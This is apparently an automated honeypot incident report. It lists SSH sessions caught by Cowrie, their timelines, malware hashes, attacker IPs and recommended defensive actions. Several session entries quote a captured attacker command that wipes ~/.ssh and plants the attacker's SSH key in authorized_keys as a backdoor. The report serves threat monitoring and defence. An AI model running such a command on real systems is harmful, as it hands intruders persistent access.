| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:48:28` | `cowrie.session.connect` |
| `2026-05-13 17:48:28` | `cowrie.client.version` |
| `2026-05-13 17:48:29` | `cowrie.client.kex` |
| `2026-05-13 17:48:30` | `cowrie.login.success` |
| `2026-05-13 17:48:31` | `cowrie.session.params` |
| `2026-05-13 17:48:31` | `cowrie.command.input` |
| `2026-05-13 17:48:31` | `cowrie.command.failed` |
| `2026-05-13 17:48:31` | `cowrie.log.closed` |
| `2026-05-13 17:48:32` | `cowrie.session.params` |
| `2026-05-13 17:48:32` | `cowrie.command.input` |
| `2026-05-13 17:48:33` | `cowrie.session.file_download` |
| `2026-05-13 17:48:33` | `cowrie.log.closed` |
| `2026-05-13 17:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94fab866c483

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:48 |
| **Last Seen** | 2026-05-13 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:48:37` | `cowrie.session.connect` |
| `2026-05-13 17:48:37` | `cowrie.client.version` |
| `2026-05-13 17:48:37` | `cowrie.client.kex` |
| `2026-05-13 17:48:39` | `cowrie.login.success` |
| `2026-05-13 17:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255672f3c2cf

| Field | Detail |
|---|---|
| **Source IP** | `125.39.179[.]192` |
| **First Seen** | 2026-05-13 17:53 |
| **Last Seen** | 2026-05-13 17:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:53:25` | `cowrie.session.connect` |
| `2026-05-13 17:53:25` | `cowrie.client.version` |
| `2026-05-13 17:53:26` | `cowrie.client.kex` |
| `2026-05-13 17:53:26` | `cowrie.login.success` |
| `2026-05-13 17:53:26` | `cowrie.session.params` |
| `2026-05-13 17:53:26` | `cowrie.command.input` |
| `2026-05-13 17:53:26` | `cowrie.command.failed` |
| `2026-05-13 17:53:27` | `cowrie.log.closed` |
| `2026-05-13 17:53:27` | `cowrie.session.params` |
| `2026-05-13 17:53:27` | `cowrie.command.input` |
| `2026-05-13 17:53:27` | `cowrie.session.file_download` |
| `2026-05-13 17:53:27` | `cowrie.log.closed` |
| `2026-05-13 17:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.179[.]192` to AbuseIPDB if not already reported
- [ ] Block `125.39.179[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f281119c45b0

| Field | Detail |
|---|---|
| **Source IP** | `125.39.179[.]192` |
| **First Seen** | 2026-05-13 17:53 |
| **Last Seen** | 2026-05-13 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:53:29` | `cowrie.session.connect` |
| `2026-05-13 17:53:29` | `cowrie.client.version` |
| `2026-05-13 17:53:29` | `cowrie.client.kex` |
| `2026-05-13 17:53:30` | `cowrie.login.success` |
| `2026-05-13 17:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.179[.]192` to AbuseIPDB if not already reported
- [ ] Block `125.39.179[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e192bca6199

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:53 |
| **Last Seen** | 2026-05-13 17:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:53:42` | `cowrie.session.connect` |
| `2026-05-13 17:53:42` | `cowrie.client.version` |
| `2026-05-13 17:53:42` | `cowrie.client.kex` |
| `2026-05-13 17:53:44` | `cowrie.login.success` |
| `2026-05-13 17:53:45` | `cowrie.session.params` |
| `2026-05-13 17:53:45` | `cowrie.command.input` |
| `2026-05-13 17:53:45` | `cowrie.command.failed` |
| `2026-05-13 17:53:45` | `cowrie.log.closed` |
| `2026-05-13 17:53:46` | `cowrie.session.params` |
| `2026-05-13 17:53:46` | `cowrie.command.input` |
| `2026-05-13 17:53:47` | `cowrie.session.file_download` |
| `2026-05-13 17:53:47` | `cowrie.log.closed` |
| `2026-05-13 17:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d56237e7c9b

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:53 |
| **Last Seen** | 2026-05-13 17:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:53:51` | `cowrie.session.connect` |
| `2026-05-13 17:53:51` | `cowrie.client.version` |
| `2026-05-13 17:53:51` | `cowrie.client.kex` |
| `2026-05-13 17:53:53` | `cowrie.login.success` |
| `2026-05-13 17:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3995a952e809

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:57 |
| **Last Seen** | 2026-05-13 17:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:57:46` | `cowrie.session.connect` |
| `2026-05-13 17:57:46` | `cowrie.client.version` |
| `2026-05-13 17:57:46` | `cowrie.client.kex` |
| `2026-05-13 17:57:48` | `cowrie.login.success` |
| `2026-05-13 17:57:49` | `cowrie.session.params` |
| `2026-05-13 17:57:49` | `cowrie.command.input` |
| `2026-05-13 17:57:49` | `cowrie.command.failed` |
| `2026-05-13 17:57:49` | `cowrie.log.closed` |
| `2026-05-13 17:57:50` | `cowrie.session.params` |
| `2026-05-13 17:57:50` | `cowrie.command.input` |
| `2026-05-13 17:57:50` | `cowrie.session.file_download` |
| `2026-05-13 17:57:50` | `cowrie.log.closed` |
| `2026-05-13 17:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08a2dd2d7dcc

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 17:57 |
| **Last Seen** | 2026-05-13 17:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 17:57:55` | `cowrie.session.connect` |
| `2026-05-13 17:57:55` | `cowrie.client.version` |
| `2026-05-13 17:57:55` | `cowrie.client.kex` |
| `2026-05-13 17:57:56` | `cowrie.login.success` |
| `2026-05-13 17:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47aa9d4abcf

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 18:00 |
| **Last Seen** | 2026-05-13 18:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:00:52` | `cowrie.session.connect` |
| `2026-05-13 18:00:52` | `cowrie.client.version` |
| `2026-05-13 18:00:52` | `cowrie.client.kex` |
| `2026-05-13 18:00:54` | `cowrie.login.success` |
| `2026-05-13 18:00:55` | `cowrie.session.params` |
| `2026-05-13 18:00:55` | `cowrie.command.input` |
| `2026-05-13 18:00:55` | `cowrie.command.failed` |
| `2026-05-13 18:00:55` | `cowrie.log.closed` |
| `2026-05-13 18:00:56` | `cowrie.session.params` |
| `2026-05-13 18:00:56` | `cowrie.command.input` |
| `2026-05-13 18:00:57` | `cowrie.session.file_download` |
| `2026-05-13 18:00:57` | `cowrie.log.closed` |
| `2026-05-13 18:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5cd84ef7bbf

| Field | Detail |
|---|---|
| **Source IP** | `179.51.153[.]37` |
| **First Seen** | 2026-05-13 18:01 |
| **Last Seen** | 2026-05-13 18:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 18:01:01` | `cowrie.session.connect` |
| `2026-05-13 18:01:01` | `cowrie.client.version` |
| `2026-05-13 18:01:01` | `cowrie.client.kex` |
| `2026-05-13 18:01:03` | `cowrie.login.success` |
| `2026-05-13 18:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.51.153[.]37` to AbuseIPDB if not already reported
- [ ] Block `179.51.153[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **35** | 2026-05-13 14:43 | 2026-05-13 17:48 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `122.161.46[.]192` | **21** | 2026-05-13 15:38 | 2026-05-13 16:30 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `195.250.72[.]168` | **20** | 2026-05-13 15:45 | 2026-05-13 16:22 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.51.153[.]37` | **19** | 2026-05-13 17:29 | 2026-05-13 18:04 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.36.126[.]68` | **2** | 2026-05-13 16:46 | 2026-05-13 16:48 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.15.225[.]33` | **2** | 2026-05-13 17:41 | 2026-05-13 17:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.15.51[.]236` | 1 | 2026-05-13 14:56 | 2026-05-13 14:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]35` | 1 | 2026-05-13 15:48 | 2026-05-13 15:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.79.99[.]233` | 1 | 2026-05-13 18:02 | 2026-05-13 18:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]125` | 1 | 2026-05-13 17:54 | 2026-05-13 17:54 | 27s | 0 | `T1592` | 🟢 LOW |
| `117.62.203[.]160` | 1 | 2026-05-13 16:39 | 2026-05-13 16:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.54[.]170` | 1 | 2026-05-13 16:47 | 2026-05-13 16:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.39.179[.]192` | 1 | 2026-05-13 17:53 | 2026-05-13 17:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.77.133[.]94` | 1 | 2026-05-13 16:35 | 2026-05-13 16:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `129.222.203[.]132` | 1 | 2026-05-13 16:38 | 2026-05-13 16:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.114[.]55` | 1 | 2026-05-13 17:55 | 2026-05-13 17:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.64[.]39` | 1 | 2026-05-13 16:41 | 2026-05-13 16:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.7.9[.]55` | 1 | 2026-05-13 16:52 | 2026-05-13 16:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.229.197[.]38` | 1 | 2026-05-13 17:00 | 2026-05-13 17:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.0.214[.]136` | 1 | 2026-05-13 16:40 | 2026-05-13 16:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.50.142[.]78` | 1 | 2026-05-13 16:56 | 2026-05-13 16:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.39.208[.]26` | 1 | 2026-05-13 16:36 | 2026-05-13 16:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]91` | 1 | 2026-05-13 16:23 | 2026-05-13 16:23 | 1s | 0 | `T1592` | 🟢 LOW |
| `202.145.0[.]18` | 1 | 2026-05-13 16:35 | 2026-05-13 16:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.196.174[.]3` | 1 | 2026-05-13 15:46 | 2026-05-13 15:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.112.133[.]74` | 1 | 2026-05-13 16:54 | 2026-05-13 16:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.95.194[.]51` | 1 | 2026-05-13 16:55 | 2026-05-13 16:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.90.100[.]147` | 1 | 2026-05-13 17:24 | 2026-05-13 17:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.220.135[.]32` | 1 | 2026-05-13 15:42 | 2026-05-13 15:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.236.176[.]239` | 1 | 2026-05-13 15:47 | 2026-05-13 15:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]168` | 1 | 2026-05-13 16:21 | 2026-05-13 16:21 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]78` | 1 | 2026-05-13 16:21 | 2026-05-13 16:21 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `101.126.89[.]35` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `1.15.51[.]236` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 42 |
| `181.0.214[.]136` | AR | Telecom Argentina S.A. | **100** ⚠️ | 5 |
| `125.77.133[.]94` | CN | CHINANET Fujian province network | **100** ⚠️ | 18 |
| `189.50.142[.]78` | BR | SAMM TECNOLOGIA E TELECOMUNICACOES S.A | **100** ⚠️ | 50 |
| `111.79.99[.]233` | CN | CHINANET JIANGXI PROVINCE NETWORK | **100** ⚠️ | 0 |
| `14.103.114[.]55` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `20.15.225[.]33` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `125.39.179[.]192` | CN | Beijing Shenglian Venture Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.54[.]170` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 28 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 172 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 85 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 75 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 43 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 43 |

---

## 🔕 False Positive Summary (64 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 2 below threshold 25 | 22 |
